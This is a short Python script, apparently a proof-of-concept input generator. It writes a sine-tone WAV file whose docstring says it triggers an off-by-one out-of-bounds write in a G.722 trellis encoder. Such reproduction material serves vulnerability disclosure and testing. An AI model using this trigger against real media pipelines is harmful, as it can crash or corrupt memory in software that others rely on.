#!/usr/bin/env python3
"""
Generate a minimal 16kHz mono 16-bit PCM WAV file for triggering
the G.722 trellis encoder OOB write vulnerability.

The WAV file has an even number of samples (3200 = 10 frames of 320 samples each)
to ensure the off-by-one condition in g722_encode_trellis() is triggered.
"""
import struct
import math

SAMPLE_RATE = 16000
NUM_CHANNELS = 1
BITS_PER_SAMPLE = 16
# 10 frames of 320 samples each; each frame has even nb_samples
NUM_SAMPLES = 3200

def generate_wav(filename):
    # Generate simple sine wave PCM samples
    samples = []
    freq = 1000  # 1kHz tone
    amplitude = 16000
    for i in range(NUM_SAMPLES):
        val = int(amplitude * math.sin(2 * math.pi * freq * i / SAMPLE_RATE))
        samples.append(val)

    pcm_data = struct.pack(f'<{NUM_SAMPLES}h', *samples)
    data_size = len(pcm_data)

    block_align = NUM_CHANNELS * BITS_PER_SAMPLE // 8
    byte_rate = SAMPLE_RATE * block_align

    # fmt chunk (16 bytes for PCM)
    fmt_chunk = struct.pack('<HHIIHH',
        1,              # audio format: PCM
        NUM_CHANNELS,   # num channels
        SAMPLE_RATE,    # sample rate
        byte_rate,      # byte rate
        block_align,    # block align
        BITS_PER_SAMPLE # bits per sample
    )

    # Build full WAV
    riff_size = 4 + 8 + len(fmt_chunk) + 8 + data_size  # "WAVE" + fmt header + data header + data

    wav = b'RIFF'
    wav += struct.pack('<I', riff_size)
    wav += b'WAVE'
    wav += b'fmt '
    wav += struct.pack('<I', len(fmt_chunk))
    wav += fmt_chunk
    wav += b'data'
    wav += struct.pack('<I', data_size)
    wav += pcm_data

    with open(filename, 'wb') as f:
        f.write(wav)

    print(f"Generated {filename}: {NUM_SAMPLES} samples @ {SAMPLE_RATE}Hz, {data_size} bytes PCM data")

if __name__ == '__main__':
    generate_wav('vuln_001_input.wav')
